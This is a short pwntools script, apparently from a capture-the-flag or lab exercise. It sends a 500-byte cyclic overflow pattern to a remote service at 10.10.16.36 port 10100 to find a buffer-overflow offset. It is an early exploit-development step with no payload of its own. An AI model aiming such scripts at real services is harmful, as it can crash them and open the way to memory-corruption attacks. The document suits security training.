from pwn import *

payload = cyclic(500)

p = remote('10.10.16.36', 10100)
p.sendline(payload)
